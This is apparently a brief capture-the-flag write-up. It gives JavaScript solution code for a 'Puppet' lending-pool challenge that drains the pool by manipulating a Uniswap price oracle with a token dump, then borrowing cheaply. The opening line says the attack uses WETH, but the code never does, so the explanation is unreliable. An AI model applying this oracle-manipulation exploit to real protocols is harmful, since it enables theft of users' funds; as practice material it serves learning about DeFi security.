Same as the previous one Puppet but instead we must use here WETH which is equivalent to eth.
```javascript
const attackPuppet = this.lendingPool.connect(attacker);
        const attackToken = this.token.connect(attacker);
        const attackUniSwap = this.uniswapExchange.connect(attacker);
        // Approve token to swap with UniSwap
        await attackToken.approve(attackUniSwap.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        // Calculate ETH Pay out
        await attackUniSwap.tokenToEthSwapInput(
            ATTACKER_INITIAL_TOKEN_BALANCE, // Exact amount of tokens to transfer
            ethers.utils.parseEther("9"), // we at least want to get 9 eth
            (await ethers.provider.getBlock('latest')).timestamp * 2, // max time for the transaction to be done
        )
        // Deposit ETH required to gain ALL tokens from the pool
        const deposit = await attackPuppet.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, {
            value: deposit
        })
        const ethReq = await attackUniSwap.getEthToTokenOutputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,
        {
            gasLimit: 1e6
        })
        // Get our original 1000 tokens back by swapping eth
        await attackUniSwap.ethToTokenSwapOutput(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
            {
                value: ethReq,
                gasLimit: 1e6
            }
        )
```